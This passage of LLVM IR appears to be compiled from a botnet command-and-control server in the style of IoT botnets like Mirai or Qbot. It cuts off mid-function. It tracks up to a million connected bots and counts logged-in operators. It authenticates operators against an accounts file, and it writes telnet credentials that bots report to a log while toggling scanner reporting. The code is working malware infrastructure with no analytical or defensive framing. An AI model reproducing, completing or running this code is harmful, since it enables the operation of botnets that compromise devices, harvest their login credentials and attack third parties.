  %104 = bitcast %struct.sockaddr* %8 to %struct.sockaddr_in*
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %104, i32 0, i32 2
  %106 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %105, i32 0, i32 0
  %107 = load i32, i32* %106, align 2
  %108 = load i32, i32* %10, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %109
  %111 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %110, i32 0, i32 0
  store i32 %107, i32* %111, align 8
  store i32 0, i32* %12, align 4
  store i32 0, i32* %11, align 4
  br label %112

112:                                              ; preds = %141, %103
  %113 = load i32, i32* %11, align 4
  %114 = icmp slt i32 %113, 1000000
  br i1 %114, label %115, label %144

115:                                              ; preds = %112
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %117
  %119 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %118, i32 0, i32 1
  %120 = load i8, i8* %119, align 4
  %121 = icmp ne i8 %120, 0
  br i1 %121, label %122, label %126

122:                                              ; preds = %115
  %123 = load i32, i32* %11, align 4
  %124 = load i32, i32* %10, align 4
  %125 = icmp eq i32 %123, %124
  br i1 %125, label %126, label %127

126:                                              ; preds = %122, %115
  br label %141

127:                                              ; preds = %122
  %128 = load i32, i32* %11, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %129
  %131 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %130, i32 0, i32 0
  %132 = load i32, i32* %131, align 8
  %133 = load i32, i32* %10, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %134
  %136 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %135, i32 0, i32 0
  %137 = load i32, i32* %136, align 8
  %138 = icmp eq i32 %132, %137
  br i1 %138, label %139, label %140

139:                                              ; preds = %127
  store i32 1, i32* %12, align 4
  br label %144

140:                                              ; preds = %127
  br label %141

141:                                              ; preds = %140, %126
  %142 = load i32, i32* %11, align 4
  %143 = add nsw i32 %142, 1
  store i32 %143, i32* %11, align 4
  br label %112, !llvm.loop !12

144:                                              ; preds = %139, %112
  %145 = load i32, i32* %12, align 4
  %146 = icmp ne i32 %145, 0
  br i1 %146, label %147, label %157

147:                                              ; preds = %144
  %148 = load i32, i32* %10, align 4
  %149 = call i64 @send(i32 %148, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.7, i64 0, i64 0), i64 13, i32 16384)
  %150 = icmp eq i64 %149, -1
  br i1 %150, label %151, label %154

151:                                              ; preds = %147
  %152 = load i32, i32* %10, align 4
  %153 = call i32 @close(i32 %152)
  br label %88

154:                                              ; preds = %147
  %155 = load i32, i32* %10, align 4
  %156 = call i32 @close(i32 %155)
  br label %88

157:                                              ; preds = %144
  %158 = load i32, i32* %10, align 4
  %159 = call i32 @make_socket_non_blocking(i32 %158)
  store i32 %159, i32* %5, align 4
  %160 = load i32, i32* %5, align 4
  %161 = icmp eq i32 %160, -1
  br i1 %161, label %162, label %165

162:                                              ; preds = %157
  %163 = load i32, i32* %10, align 4
  %164 = call i32 @close(i32 %163)
  br label %185

165:                                              ; preds = %157
  %166 = load i32, i32* %10, align 4
  %167 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 1
  %168 = bitcast %union.epoll_data* %167 to i32*
  store i32 %166, i32* %168, align 1
  %169 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 0
  store i32 -2147483647, i32* %169, align 1
  %170 = load volatile i32, i32* @epollFD, align 4
  %171 = load i32, i32* %10, align 4
  %172 = call i32 @epoll_ctl(i32 %170, i32 1, i32 %171, %struct.epoll_event* %3) #9
  store i32 %172, i32* %5, align 4
  %173 = load i32, i32* %5, align 4
  %174 = icmp eq i32 %173, -1
  br i1 %174, label %175, label %178

175:                                              ; preds = %165
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0))
  %176 = load i32, i32* %10, align 4
  %177 = call i32 @close(i32 %176)
  br label %185

178:                                              ; preds = %165
  %179 = load i32, i32* %10, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %180
  %182 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %181, i32 0, i32 1
  store i8 1, i8* %182, align 4
  %183 = load i32, i32* %10, align 4
  %184 = call i64 @send(i32 %183, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.9, i64 0, i64 0), i64 14, i32 16384)
  br label %88

185:                                              ; preds = %175, %162, %102, %101
  br label %294

186:                                              ; preds = %77
  %187 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %188 = load i32, i32* %7, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %187, i64 %189
  %191 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %190, i32 0, i32 1
  %192 = bitcast %union.epoll_data* %191 to i32*
  %193 = load i32, i32* %192, align 1
  store i32 %193, i32* %13, align 4
  %194 = load i32, i32* %13, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %195
  store %struct.clientdata_t* %196, %struct.clientdata_t** %14, align 8
  store i32 0, i32* %15, align 4
  %197 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %198 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %197, i32 0, i32 1
  store i8 1, i8* %198, align 4
  br label %199

199:                                              ; preds = %186, %290
  %200 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %200, i8 0, i64 2048, i1 false)
  br label %201

201:                                              ; preds = %265, %264, %257, %249, %233, %227, %199
  %202 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %202, i8 0, i64 2048, i1 false)
  %203 = icmp ne i8* %202, null
  br i1 %203, label %204, label %210

204:                                              ; preds = %201
  %205 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %206 = load i32, i32* %13, align 4
  %207 = call i32 @fdgets(i8* %205, i32 2048, i32 %206)
  %208 = sext i32 %207 to i64
  store i64 %208, i64* %16, align 8
  %209 = icmp sgt i64 %208, 0
  br label %210

210:                                              ; preds = %204, %201
  %211 = phi i1 [ false, %201 ], [ %209, %204 ]
  br i1 %211, label %212, label %268

212:                                              ; preds = %210
  %213 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %214 = call i8* @strstr(i8* %213, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0)) #8
  %215 = icmp eq i8* %214, null
  br i1 %215, label %216, label %217

216:                                              ; preds = %212
  store i32 1, i32* %15, align 4
  br label %268

217:                                              ; preds = %212
  %218 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @trim(i8* %218)
  %219 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %220 = call i32 @strcmp(i8* %219, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %221 = icmp eq i32 %220, 0
  br i1 %221, label %222, label %228

222:                                              ; preds = %217
  %223 = load i32, i32* %13, align 4
  %224 = call i64 @send(i32 %223, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i64 0, i64 0), i64 5, i32 16384)
  %225 = icmp eq i64 %224, -1
  br i1 %225, label %226, label %227

226:                                              ; preds = %222
  store i32 1, i32* %15, align 4
  br label %268

227:                                              ; preds = %222
  br label %201, !llvm.loop !13

228:                                              ; preds = %217
  %229 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %230 = call i8* @strstr(i8* %229, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i64 0, i64 0)) #8
  %231 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %232 = icmp eq i8* %230, %231
  br i1 %232, label %233, label %244

233:                                              ; preds = %228
  %234 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %235 = call i8* @strstr(i8* %234, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i64 0, i64 0)) #8
  %236 = getelementptr inbounds i8, i8* %235, i64 7
  store i8* %236, i8** %18, align 8
  %237 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %238 = load i8*, i8** %18, align 8
  %239 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %237, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.12, i64 0, i64 0), i8* %238)
  %240 = load %struct._IO_FILE*, %struct._IO_FILE** @telFD, align 8
  %241 = call i32 @fflush(%struct._IO_FILE* %240)
  %242 = load volatile i32, i32* @TELFound, align 4
  %243 = add nsw i32 %242, 1
  store volatile i32 %243, i32* @TELFound, align 4
  br label %201, !llvm.loop !13

244:                                              ; preds = %228
  %245 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %246 = call i8* @strstr(i8* %245, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i64 0, i64 0)) #8
  %247 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %248 = icmp eq i8* %246, %247
  br i1 %248, label %249, label %252

249:                                              ; preds = %244
  %250 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %251 = call i8* @strstr(i8* %250, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.13, i64 0, i64 0)) #8
  store i8* %251, i8** %19, align 8
  store volatile i32 1, i32* @scannerreport, align 4
  br label %201, !llvm.loop !13

252:                                              ; preds = %244
  %253 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %254 = call i8* @strstr(i8* %253, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.14, i64 0, i64 0)) #8
  %255 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %256 = icmp eq i8* %254, %255
  br i1 %256, label %257, label %260

257:                                              ; preds = %252
  %258 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %259 = call i8* @strstr(i8* %258, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.14, i64 0, i64 0)) #8
  store i8* %259, i8** %20, align 8
  store volatile i32 0, i32* @scannerreport, align 4
  br label %201, !llvm.loop !13

260:                                              ; preds = %252
  %261 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %262 = call i32 @strcmp(i8* %261, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.15, i64 0, i64 0)) #8
  %263 = icmp eq i32 %262, 0
  br i1 %263, label %264, label %265

264:                                              ; preds = %260
  br label %201, !llvm.loop !13

265:                                              ; preds = %260
  %266 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %267 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.16, i64 0, i64 0), i8* %266)
  br label %201, !llvm.loop !13

268:                                              ; preds = %226, %216, %210
  %269 = load i64, i64* %16, align 8
  %270 = icmp eq i64 %269, -1
  br i1 %270, label %271, label %277

271:                                              ; preds = %268
  %272 = call i32* @__errno_location() #10
  %273 = load i32, i32* %272, align 4
  %274 = icmp ne i32 %273, 11
  br i1 %274, label %275, label %276

275:                                              ; preds = %271
  store i32 1, i32* %15, align 4
  br label %276

276:                                              ; preds = %275, %271
  br label %291

277:                                              ; preds = %268
  %278 = load i64, i64* %16, align 8
  %279 = icmp eq i64 %278, 0
  br i1 %279, label %280, label %281

280:                                              ; preds = %277
  store i32 1, i32* %15, align 4
  br label %291

281:                                              ; preds = %277
  br label %282

282:                                              ; preds = %281
  %283 = load i32, i32* %15, align 4
  %284 = icmp ne i32 %283, 0
  br i1 %284, label %285, label %290

285:                                              ; preds = %282
  %286 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %287 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %286, i32 0, i32 1
  store i8 0, i8* %287, align 4
  %288 = load i32, i32* %13, align 4
  %289 = call i32 @close(i32 %288)
  br label %290

290:                                              ; preds = %285, %282
  br label %199

291:                                              ; preds = %280, %276
  br label %292

292:                                              ; preds = %291
  br label %293

293:                                              ; preds = %292
  br label %294

294:                                              ; preds = %293, %185, %58
  %295 = load i32, i32* %7, align 4
  %296 = add nsw i32 %295, 1
  store i32 %296, i32* %7, align 4
  br label %27, !llvm.loop !14

297:                                              ; preds = %27
  br label %23
}

; Function Attrs: nounwind
declare noalias align 16 i8* @calloc(i64, i64) #3

declare i32 @epoll_wait(i32, %struct.epoll_event*, i32, i32) #1

declare i32 @close(i32) #1

declare i32 @accept(i32, %struct.sockaddr*, i32*) #1

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #5

declare void @perror(i8*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @make_socket_non_blocking(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

10:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.87, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

11:                                               ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = or i32 %12, 2048
  store i32 %13, i32* %4, align 4
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* %4, align 4
  %16 = call i32 (i32, i32, ...) @fcntl(i32 %14, i32 4, i32 %15)
  store i32 %16, i32* %5, align 4
  %17 = load i32, i32* %5, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %11
  call void @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.87, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

20:                                               ; preds = %11
  store i32 0, i32* %2, align 4
  br label %21

21:                                               ; preds = %20, %19, %10
  %22 = load i32, i32* %2, align 4
  ret i32 %22
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32, i32, i32, %struct.epoll_event*) #3

; Function Attrs: nounwind readonly willreturn
declare i8* @strstr(i8*, i8*) #2

declare i32 @fprintf(%struct._IO_FILE*, i8*, ...) #1

declare i32 @fflush(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @BotsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 1
  %11 = load i8, i8* %10, align 4
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !15

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @TitleWriter(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca [2048 x i8], align 16
  store i8* %0, i8** %2, align 8
  %5 = load i8*, i8** %2, align 8
  %6 = ptrtoint i8* %5 to i32
  store i32 %6, i32* %3, align 4
  br label %7

7:                                                ; preds = %1, %20
  %8 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %8, i8 0, i64 2048, i1 false)
  %9 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %10 = call i32 @BotsConnected()
  %11 = load volatile i32, i32* @OperatorsConnected, align 4
  %12 = call i32 (i8*, i8*, ...) @sprintf(i8* %9, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.17, i64 0, i64 0), i32 27, i32 %10, i32 %11, i32 7) #9
  %13 = load i32, i32* %3, align 4
  %14 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %15 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  %16 = call i64 @strlen(i8* %15) #8
  %17 = call i64 @send(i32 %13, i8* %14, i64 %16, i32 16384)
  %18 = icmp eq i64 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %7
  ret i8* null

20:                                               ; preds = %7
  %21 = call i32 @sleep(i32 2)
  br label %7
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #3

declare i32 @sleep(i32) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @Find_Login(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i64 0, i64 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

11:                                               ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %42

12:                                               ; preds = %1
  br label %13

13:                                               ; preds = %27, %12
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %16 = call i8* @fgets(i8* %14, i32 512, %struct._IO_FILE* %15)
  %17 = icmp ne i8* %16, null
  br i1 %17, label %18, label %30

18:                                               ; preds = %13
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %20 = load i8*, i8** %3, align 8
  %21 = call i8* @strstr(i8* %19, i8* %20) #8
  %22 = icmp ne i8* %21, null
  br i1 %22, label %23, label %27

23:                                               ; preds = %18
  %24 = load i32, i32* %6, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %6, align 4
  %26 = load i32, i32* %5, align 4
  store i32 %26, i32* %7, align 4
  br label %27

27:                                               ; preds = %23, %18
  %28 = load i32, i32* %5, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %5, align 4
  br label %13, !llvm.loop !16

30:                                               ; preds = %13
  %31 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %32 = icmp ne %struct._IO_FILE* %31, null
  br i1 %32, label %33, label %36

33:                                               ; preds = %30
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %35 = call i32 @fclose(%struct._IO_FILE* %34)
  br label %36

36:                                               ; preds = %33, %30
  %37 = load i32, i32* %6, align 4
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %40

39:                                               ; preds = %36
  store i32 0, i32* %2, align 4
  br label %42

40:                                               ; preds = %36
  %41 = load i32, i32* %7, align 4
  store i32 %41, i32* %2, align 4
  br label %42

42:                                               ; preds = %40, %39, %11
  %43 = load i32, i32* %2, align 4
  ret i32 %43
}

declare noalias %struct._IO_FILE* @fopen(i8*, i8*) #1

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #1

declare i32 @fclose(%struct._IO_FILE*) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @BotWorker(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca [2048 x i8], align 16
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca [2048 x i8], align 16
  %11 = alloca %struct._IO_FILE*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca [80 x i8], align 16
  %17 = alloca [5000 x i8], align 16
  %18 = alloca [5000 x i8], align 16
  %19 = alloca [5000 x i8], align 16
  %20 = alloca [5000 x i8], align 16
  %21 = alloca [5000 x i8], align 16
  %22 = alloca [5000 x i8], align 16
  %23 = alloca [5000 x i8], align 16
  %24 = alloca [5000 x i8], align 16
  %25 = alloca [5000 x i8], align 16
  %26 = alloca [80 x i8], align 16
  %27 = alloca [2048 x i8], align 16
  %28 = alloca [2048 x i8], align 16
  %29 = alloca [2048 x i8], align 16
  %30 = alloca [80 x i8], align 16
  %31 = alloca [80 x i8], align 16
  %32 = alloca [80 x i8], align 16
  %33 = alloca [80 x i8], align 16
  %34 = alloca [80 x i8], align 16
  %35 = alloca [80 x i8], align 16
  %36 = alloca [80 x i8], align 16
  %37 = alloca [80 x i8], align 16
  %38 = alloca [80 x i8], align 16
  %39 = alloca [80 x i8], align 16
  %40 = alloca [80 x i8], align 16
  %41 = alloca [80 x i8], align 16
  %42 = alloca [80 x i8], align 16
  %43 = alloca [80 x i8], align 16
  %44 = alloca [80 x i8], align 16
  %45 = alloca [80 x i8], align 16
  %46 = alloca [80 x i8], align 16
  %47 = alloca [80 x i8], align 16
  %48 = alloca [80 x i8], align 16
  %49 = alloca [80 x i8], align 16
  %50 = alloca [80 x i8], align 16
  %51 = alloca [80 x i8], align 16
  %52 = alloca [2048 x i8], align 16
  %53 = alloca [2048 x i8], align 16
  %54 = alloca [80 x i8], align 16
  %55 = alloca [80 x i8], align 16
  %56 = alloca [2048 x i8], align 16
  %57 = alloca %struct._IO_FILE*, align 8
  %58 = alloca i64, align 8
  %59 = alloca %struct.tm*, align 8
  %60 = alloca [50 x i8], align 16
  %61 = alloca [50 x i8], align 16
  store i8* %0, i8** %3, align 8
  %62 = load i8*, i8** %3, align 8
  %63 = ptrtoint i8* %62 to i32
  store i32 %63, i32* %4, align 4
  %64 = load volatile i32, i32* @OperatorsConnected, align 4
  %65 = add nsw i32 %64, 1
  store volatile i32 %65, i32* @OperatorsConnected, align 4
  %66 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %66, i8 0, i64 2048, i1 false)
  %67 = getelementptr inbounds [2048 x i8], [2048 x i8]* %10, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %67, i8 0, i64 2048, i1 false)
  store i32 0, i32* %12, align 4
  %68 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i64 0, i64 0))
  store %struct._IO_FILE* %68, %struct._IO_FILE** %11, align 8
  br label %69

69:                                               ; preds = %74, %1
  %70 = load %struct._IO_FILE*, %struct._IO_FILE** %11, align 8
  %71 = call i32 @feof(%struct._IO_FILE* %70) #9
  %72 = icmp ne i32 %71, 0
  %73 = xor i1 %72, true
  br i1 %73, label %74, label %79

74:                                               ; preds = %69
  %75 = load %struct._IO_FILE*, %struct._IO_FILE** %11, align 8
  %76 = call i32 @fgetc(%struct._IO_FILE* %75)
  store i32 %76, i32* %13, align 4
  %77 = load i32, i32* %12, align 4
  %78 = add nsw i32 %77, 1
  store i32 %78, i32* %12, align 4
  br label %69, !llvm.loop !17

79:                                               ; preds = %69
  store i32 0, i32* %14, align 4
  %80 = load %struct._IO_FILE*, %struct._IO_FILE** %11, align 8
  call void @rewind(%struct._IO_FILE* %80)
  br label %81

81:                                               ; preds = %86, %79
  %82 = load i32, i32* %14, align 4
  %83 = load i32, i32* %12, align 4
  %84 = sub nsw i32 %83, 1
  %85 = icmp ne i32 %82, %84
  br i1 %85, label %86, label %101

86:                                               ; preds = %81
  %87 = load %struct._IO_FILE*, %struct._IO_FILE** %11, align 8
  %88 = load i32, i32* %14, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %89
  %91 = getelementptr inbounds %struct.login_info, %struct.login_info* %90, i32 0, i32 0
  %92 = getelementptr inbounds [20 x i8], [20 x i8]* %91, i64 0, i64 0
  %93 = load i32, i32* %14, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %94
  %96 = getelementptr inbounds %struct.login_info, %struct.login_info* %95, i32 0, i32 1
  %97 = getelementptr inbounds [20 x i8], [20 x i8]* %96, i64 0, i64 0
  %98 = call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %87, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.20, i64 0, i64 0), i8* %92, i8* %97)
  %99 = load i32, i32* %14, align 4
  %100 = add nsw i32 %99, 1
  store i32 %100, i32* %14, align 4
  br label %81, !llvm.loop !18

101:                                              ; preds = %81
  %102 = load i32, i32* %4, align 4
  %103 = call i64 @send(i32 %102, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.21, i64 0, i64 0), i64 22, i32 16384)
  %104 = icmp eq i64 %103, -1
  br i1 %104, label %105, label %106

105:                                              ; preds = %101
  br label %855

106:                                              ; preds = %101
  %107 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %108 = load i32, i32* %4, align 4
  %109 = call i32 @fdgets(i8* %107, i32 2048, i32 %108)
  %110 = icmp slt i32 %109, 1
  br i1 %110, label %111, label %112

111:                                              ; preds = %106
  br label %855

112:                                              ; preds = %106
  %113 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* %113)
  %114 = load i32, i32* %5, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %115
  %117 = getelementptr inbounds %struct.login_info, %struct.login_info* %116, i32 0, i32 0
  %118 = getelementptr inbounds [20 x i8], [20 x i8]* %117, i64 0, i64 0
  %119 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %120 = call i32 (i8*, i8*, ...) @sprintf(i8* %118, i8* %119) #9
  %121 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  store i8* %121, i8** %15, align 8
  %122 = load i8*, i8** %15, align 8
  %123 = call i32 @Find_Login(i8* %122)
  store i32 %123, i32* %5, align 4
  %124 = load i8*, i8** %15, align 8
  %125 = load i32, i32* %5, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds [22 x %struct.login_info], [22 x %struct.login_info]* @accounts, i64 0, i64 %126
  %128 = getelementptr inbounds %struct.login_info, %struct.login_info* %127, i32 0, i32 0
  %129 = getelementptr inbounds [20 x i8], [20 x i8]* %128, i64 0, i64 0
  %130 = call i32 @strcmp(i8* %124, i8* %129) #8
  %131 = icmp eq i32 %130, 0
  br i1 %131, label %132, label %156

132:                                              ; preds = %112
  %133 = load i32, i32* %4, align 4
  %134 = call i64 @send(i32 %133, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.23, i64 0, i64 0), i64 22, i32 16384)
  %135 = icmp eq i64 %134, -1
  br i1 %135, label %136, label %137

136:                                              ; preds = %132
  br label %855

137:                                              ; preds = %132
  %138 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %139 = load i32, i32* %4, align 4
  %140 = call i32 @fdgets(i8* %138, i32 2048, i32 %139)
  %141 = icmp slt i32 %140, 1
  br i1 %141, label %142, label %143

142:                                              ; preds = %137
  br label %855

143:                                              ; preds = %137
  %144 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* %144)
  %145 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %146 = load i32, i32* %5, align 4
